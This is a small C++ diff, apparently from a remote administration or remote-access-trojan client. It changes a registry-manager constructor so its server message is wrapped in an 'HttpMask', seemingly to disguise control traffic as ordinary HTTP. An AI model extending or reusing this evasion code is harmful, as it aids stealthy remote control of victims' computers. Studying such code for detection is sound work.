@@ -13,7 +13,8 @@
 CRegisterManager::CRegisterManager(IOCPClient* ClientObject, int n, void* user):CManager(ClientObject)
 {
 	BYTE bToken=TOKEN_REGEDIT;
-	m_ClientObject->Send2Server((char*)&bToken, 1);
+	HttpMask mask(DEFAULT_HOST, m_ClientObject->GetClientIPHeader());
+	m_ClientObject->Send2Server((char*)&bToken, 1, &mask);
 }
 
 CRegisterManager::~CRegisterManager()
